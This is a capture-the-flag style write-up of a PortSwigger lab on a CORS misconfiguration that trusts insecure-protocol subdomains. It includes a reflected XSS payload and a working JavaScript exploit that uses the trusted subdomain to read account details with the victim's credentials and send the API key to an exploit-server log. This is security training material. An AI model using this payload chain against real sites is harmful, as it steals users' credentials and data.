# [Lab: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

## Lab

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

## Analysis

header of the request's response to `/accountDetails` contains `Access-Control-Allow-Credentials`.

- request from exploit-server, the `Access-Control-Allow-Origin` is reflected with subdomain `**.id.web-security-academy.net`

use the `check stock` function at product page, we know that there is a subdomain `stock.id.web-security-academy.net`.

this subdomain is vulnerable to XSS:

```http
GET /?productId=<script>alert()</script>&storeId=1 HTTP/1.1
```

- response:

  ```html
  <h4>ERROR</h4>Invalid product ID: <script>alert()</script>
  ```

## Solutions

exploit the xss from trusted subdomain to retrieve sensitive information.

craft a response at exploit-server:

- body:

  ```js
  <script>
      document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
  </script>
  ```

deliver to victim and observe the apikey => solved
